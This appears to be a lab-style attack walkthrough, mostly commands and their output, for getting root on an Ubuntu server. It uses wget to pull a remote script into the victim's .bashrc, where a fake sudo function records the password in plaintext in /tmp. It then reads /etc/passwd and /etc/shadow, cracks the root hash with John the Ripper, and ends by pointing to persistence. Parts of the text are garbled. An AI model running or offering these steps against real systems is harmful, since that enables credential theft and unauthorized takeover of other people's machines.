## Our goal is to gain access to the root account. The Ubuntu server was misconfigured to let the victims account to have full sudo
privileges. fuWe will need to use a tool called 'nction sudo' which will record and store the users sudo password in the /tmp directory as HackedPasswd.txt
in plaintext. ##

## First, run this command on the connection between the machines to add the function sudo to the bashrc file. The bashrc file is a script file that
executes when the user logs in and a bash script is started. ##
wget -O- 'https://git.io/fhNWm' >> ~/.bashrc

## From here, the attacker would wait for the user to use sudo such as: sudo apt update to capture the victims password. ##

## From here victims password is stored in the /tmp/HackedPasswd.txt file in plain text. ##
cd /tmp
cat HackedPasswd.txt
hunter

## From here, the attacker now has the sudo password for the victims account and by running sudo -l, the attacker sees there is full
sudo privilege for the victims account ##

## The attacker will crack the root accounts password by using the built-in kali linux tool, john the ripper. John the ripper enables attackers to copy from
the victimsm /etc/passwd and /etc/shadow files where the password hash and user information is combined to test against a wordfile containing millions 
of commonly used passwords .##

sudo cat /etc/passwd

copy: root:x:0:0:root:/root:/bin/bash

echo root:x:0:0:root:/root:/bin/bash > passwd

cat /etc/shadow

copy: root:$y$j9T$E.J1enhCVRWdMtXn5pDjW0$zv1ofNl0k0q970z39q6blVQ0Qv4I7LPeAU66V4sNF17:19184:0:99999:7:::

echo root:$y$j9T$E.J1enhCVRWdMtXn5pDjW0$zv1ofNl0k0q970z39q6blVQ0Qv4I7LPeAU66V4sNF17:19184:0:99999:7::: > shadow

unshadow passwd shadow > unshadowed.txt

## Finally, to crack the roots password run: ##

john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
crafty4life

## Login to root and run the whoami command: ##
su
crafty4life

whoami
"root"

Next step: Persistence.

